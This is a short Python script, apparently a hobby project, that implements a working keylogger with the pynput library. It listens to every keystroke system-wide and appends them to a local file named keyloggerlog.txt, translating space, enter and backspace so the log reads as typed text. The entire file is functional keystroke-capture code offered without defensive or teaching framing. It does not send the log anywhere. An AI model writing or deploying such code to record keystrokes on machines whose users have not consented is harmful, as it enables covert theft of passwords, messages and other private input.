from pynput import keyboard

# function for delate last char in KeyLoggerLog.txt file
def backspace():
    with open('keyloggerlog.txt', "r+") as file:
        content = file.read()
        new_content = content[:-1]  
        file.seek(0) 
        file.write(new_content)
        file.truncate()

# function for the start of listening
def on_key_press(key):
    try:
        key_char = key.char
        key_char = str(key_char)
    except AttributeError:
        key_char = key
        key_char = str(key_char)

        # use key space
        if "Key.space" in key_char:
            key_char = ' '
        # use key baskspace
        if "Key.backspace" in key_char:
            key_char = ''
            backspace()
        # use key enter
        if "Key.enter" in key_char:
            key_char = '\n'
    # overwrite existing file
    with open('keyloggerlog.txt','a') as file:
        file.write(key_char)


with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
    
